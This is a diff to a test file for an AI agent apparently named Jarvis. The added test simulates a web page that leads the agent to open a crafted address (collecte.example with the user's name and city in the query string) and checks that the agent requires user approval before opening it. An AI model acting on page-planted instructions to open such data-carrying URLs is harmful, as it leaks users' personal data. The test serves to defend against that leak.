@@ -13,7 +13,7 @@ from ojarvis.llm.providers.fake import FakeProvider, FakeReply, Script
 from ojarvis.llm.structured import TOOL_NAME
 from ojarvis.llm.types import LLMRequest, ToolCall
 from ojarvis.services import Services
-from tests.fake_tools import Act, Destroy, Echo, install
+from tests.fake_tools import Act, Destroy, Echo, Visit, install
 from tests.test_chat import read_sse
 
 
@@ -274,3 +274,26 @@ def test_the_action_journal_is_read_only(client: TestClient) -> None:
     assert catalog["navigateur_ouvrir"] == 1
     assert catalog["navigateur_cliquer"] == 2
     assert catalog["supprimer_fichier"] == 3
+
+
+def test_a_crafted_address_after_reading_needs_approval(
+    client: TestClient, services: Services, llm: dict[str, FakeProvider]
+) -> None:
+    """Une page demande d'ouvrir une adresse qui emporte des données : sans ta validation,
+    Jarvis ne l'ouvre pas. Les liens réellement présents dans la page restent libres."""
+    visit = Visit()
+    services.tools.register(visit)
+    llm["deepseek"]._script = scripted(
+        [
+            [ToolCall("a", "visiter", {"url": "https://site.example/piege"})],
+            [
+                ToolCall("b", "visiter", {"url": "https://boutique.example/the-vert"}),
+                ToolCall("c", "visiter", {"url": "https://collecte.example/c?d=Octave+Cotonou"}),
+            ],
+        ]
+    )
+    events = chat(client, "Résume https://site.example/piege")
+    assert visit.calls == ["https://site.example/piege", "https://boutique.example/the-vert"]
+    plan = next(d for e, d in events if e == "plan")
+    assert plan["tainted"] is True
+    assert "collecte.example" in plan["title"]
